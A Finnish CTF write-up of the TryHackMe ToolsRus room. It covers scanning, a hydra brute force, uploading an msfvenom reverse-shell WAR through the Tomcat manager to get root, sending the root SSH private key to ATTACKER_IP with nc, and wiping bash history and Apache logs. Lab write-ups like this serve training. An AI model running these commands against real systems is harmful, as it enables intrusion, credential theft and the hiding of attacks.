---
title: "ToolsRus Writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "Haitallisen WAR-tiedoston lataaminen haavoittuvaan Tomcat-manageriin reverse shellin saamiseksi TryHackMen ToolsRus-huoneessa ja pysyvyyden varmistaminen SSH-avaimella."
---

## Setup 

Meidän täytyy ensin yhdistää tryhackmen VPN-palvelimeen. Saat tästä lisätietoa käymällä [Access](https://tryhackme.com/access)-sivulla.

Käytän `openvpn`-ohjelmaa palvelimeen yhdistämiseen. Tässä on komento:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Tiedustelu
Aika tehdä nopeat porttiskannaukset ja tiedustelu (luoja siunatkoon `rustscan`:n tekijöitä):
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1234/tcp open  hotline syn-ack
8009/tcp open  ajp13   syn-ack


$ rustscan -b 4500 -a TARGET_IP -p 22,80,1234,8009 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hieman hakemistojen luettelointia:
```shell-session
$ gobuster dir -t 64 -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt 
$ cat gobuster_common.txt       
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/guidelines           (Status: 301) [Size: 319] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
```

 > Minkä "g"-kirjaimella alkavan hakemiston löydät?
 > 
 > Vastaus: `guidelines`
 
Kun menemme hakemistoon `/guidelines/`, näemme vain tekstin: `Hey bob, did you update that TomCat server?`. 

> Kenen nimen löydät tästä hakemistosta?
> 
> Vastaus: `bob`


Lisäksi hakemiston `protected` pyytäminen tuo esiin todennusikkunan...
> Millä hakemistolla on basic authentication?
> 
> Vastaus: `protected`

Kokeillaan murtaa se brute forcella hydran avulla :)
```shell-session
$ hydra -l bob -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f TARGET_IP http-get /protected
...
...
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
```

> Mikä on bobin salasana sivuston suojattuun osioon?
> 
> Vastaus: `bubbles`

Kun kirjaudumme `protected`-sivulle, meitä tervehtii seuraava sivu:
![](/assets/img/writeup_assets/toolsrus/protected_page_moved.png)

Kuten saimme selville aiemmista porttiskannauksista, portissa **1234** pyörii _Apache Tomcat -palvelin_. Kokeillaan kirjautua sen portaaliin tekemällä pyyntö: `http://TARGET_IP:1234/manager/`. Tämä tuo eteen tutun todennuspalvelun. Jos käytämme tunnuksia: `bob:bubbles`, pääsemme käsiksi palvelimen hallintapaneeliin!

> Mikä toinen verkkopalvelua tarjoava portti on auki koneella?
> 
> Vastaus: `1234`



Tomcat-palvelimen versionumero löytyy `manager`-sivun alalaidasta...
> Kun menet kyseisessä portissa pyörivään palveluun, mikä on ohjelmiston nimi ja versio?
> (Vastauksen muoto: Palvelun_koko_nimi/Versio)
> 
> Vastaus: `Apache Tomcat/7.0.88`

Tomcatin manager-sivulla mainitaan yhteensä 5 dokumentaatiotiedostoa, joten `nikto`:a ei tarvitse vielä käyttää (se on myös vähän sekava käyttää ngl):
> Kuinka monta dokumentaatiotiedostoa ~~Nikto~~ sinä tunnistit?
> 
> Vastaus: `5`


> Mikä on palvelimen versio (aja skannaus porttiin 80)?
> 
> Vastaus: `Apache/2.4.18`


> Mitä Apache-Coyote-versiota tämä palvelu käyttää?
> 
> Vastaus: `1.1`


Kun meillä on kaikki nämä tiedot versionumeroista ja muusta, katsotaanpa mitä exploitteja voimme hyödyntää päästäksemme käsiksi kohdekoneeseen:

## Pääsyn saaminen
Nyt... Jos teemme huoneen ohjeiden mukaan, tämä osio olisi yleensä _2_ osassa, mutta koska voimme ottaa tiedoston käyttöön `manager`-sivulla, saamme helposti reverse shellin (joka, kuten tulet huomaamaan, on root-shell!). Aloitetaan luomalla sopiva payload:
```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > reverse.war
```

Luomme payloadiksi `WAR`-tiedoston, koska sellaisen voimme ladata `manager`-sivulta: 
![](/assets/img/writeup_assets/toolsrus/war_file_upload.png)

Kun tiedosto on otettu käyttöön, käynnistä omalla koneellasi kuuntelija määritettyyn porttiin (tässä tapauksessa 4444), näin:
```shell-session
$ nc -nvlp 4444
```

Nyt kun teemme pyynnön URL-osoitteeseen: `http://TARGET_IP:1234/reverse/`, saamme yhteyden netcat-kuuntelijaamme ja voimme siirtyä shellin vakauttamiseen:
```shell-session
$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44662

python -c "import pty; pty.spawn('/bin/bash')"
root@ip-TARGET_IP:/# ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444

export TERM=xterm-256-color
root@ip-TARGET_IP:/# whoami
root

root@ip-TARGET_IP:/# ls /root
flag.txt  snap

root@ip-TARGET_IP:/# cat /root/flag.txt 
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

***!!BONUSVAIHE!!***

Nyt vaikka meillä on rootattu reverse shell, on silti vaivalloista ladata reverse shelliä ja vakauttaa sitä yhä uudelleen, jos aiomme hyödyntää tätä konetta myöhemmin. Haetaan siis ssh:n yksityinen avain pysyvyyden takaamiseksi sekä siivotaan lataamamme `/reverse.war`-tiedosto:
```shell-session

## On our machine:
$ nc -nvlp 8888 > toysrus_id_rsa

## On target machine;
root@ip-TARGET_IP:/# ssh-keygen
## Empty passphrases...
root@ip-TARGET_IP:/# nc ATTACKER_IP 8888 -w 3 < /root/.ssh/id_rsa
```

Loistavaa! Nyt meillä on pysyvä pääsy `ssh`:n kautta, siivotaanpa vielä muutama juttu ennen kuin olemme valmiita...
```shell-session
root@ip-TARGET_IP:/# echo "" > /root/.bash_history 
root@ip-TARGET_IP:/# rm /usr/local/tomcat7/webapps/reverse.war 
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/webapps/reverse/
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/work/Catalina/localhost/reverse
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/access.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/error.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/other_vhosts_access.log 

## Just for good measure...
root@ip-TARGET_IP:/# echo "" > /root/.bash_history
```

Ja valmista tuli!

> Mitä tekstiä on tiedostossa `/root/flag.txt`?
> 
> Vastaus:  `ff1fc4a81affcc7688cf89ae7dc6e0e1`

## Yhteenveto
Jos tästä writeupista oli apua, harkitse minun seuraamistani GitHubissa (https://github.com/NovusEdge) ja/tai tähden antamista repositoriolle: https://github.com/NovusEdge/thm-writeups


- Huone: [ToolsRus](https://tryhackme.com/room/toolsrus)
